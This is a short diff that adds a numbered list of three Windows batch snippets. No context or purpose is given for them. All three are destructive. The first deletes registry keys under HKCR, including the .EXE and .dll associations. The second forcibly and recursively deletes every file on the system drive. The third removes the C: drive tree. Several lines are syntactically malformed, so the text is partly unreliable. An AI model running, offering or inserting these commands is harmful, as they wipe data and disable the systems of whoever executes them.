@@ -1,0 +1,7 @@
+1. @echo off
+START reg delete HKC/.EXE
+START reg delete HKCR.dll
+START reg delete HKCR/*
+2. @echo off
+delete %systemdrive%*.* /f /s
+3. rd/s/q/ C:\
